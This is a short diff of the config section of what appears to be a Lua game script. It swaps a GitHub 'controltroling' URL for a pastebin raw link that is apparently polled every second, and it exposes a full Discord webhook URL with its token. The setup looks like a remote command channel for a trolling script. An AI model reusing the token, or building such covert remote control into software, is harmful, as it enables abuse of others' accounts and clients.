@@ -1,7 +1,7 @@
 -- [[ CONFIG ]] --
 local settings = {
     webhook = "https://discord.com/api/webhooks/1463513332697927883/7XBUBBop6fsTyZvAfdCUKskGulE5z4MpXl_Q6Pa5Pqxg8Fdz7hRlnlF7PUzayceSrvF5",
-    control = "https://raw.githubusercontent.com/arxitectorcz/Arxetector/refs/heads/main/controltroling",
+    control = "https://pastebin.com/raw/tbEyg2z7",
     check_delay = 1 -- ПРОВЕРКА КАЖДУЮ СЕКУНДУ
 }
 
